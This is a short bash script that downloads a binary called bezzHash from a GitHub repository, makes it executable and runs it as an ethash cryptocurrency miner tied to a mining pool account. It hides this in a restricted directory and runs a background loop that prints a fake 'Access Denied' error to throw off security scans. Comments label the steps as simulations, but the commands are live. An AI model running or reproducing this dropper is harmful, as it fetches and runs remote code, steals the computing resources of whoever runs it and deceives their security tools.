#!/bin/bash

# Function to simulate a fake signal
simulate_fake_signal() {
    echo "Error: Unable to scan the file. Access Denied."
    exit 1
}

# Function to monitor for security scan attempts
monitor_security_scan() {
    while :
    do
        # Check if bezzHash is being accessed
        if [ -e "bezzHash" ]; then
            echo "Fake signal detected! Simulating access denied."
            simulate_fake_signal
        fi
        sleep 1  # Check every second
    done
}

# Start monitoring for security scan attempts in the background
monitor_security_scan &

# Create directory with restricted access
mkdir -m 700 king

# Change directory
cd king || exit

# Download bezzHash script
wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash

# Simulate granting executable permissions
chmod +x bezzHash

# Simulate running bezzHash with specified parameters
./bezzHash --par=ethash --user Gok001 --server ethash.poolbinance.com --port 443

# Simulate successful execution
echo "Simulating successful execution of bezzHash."

# Exit script
exit 0
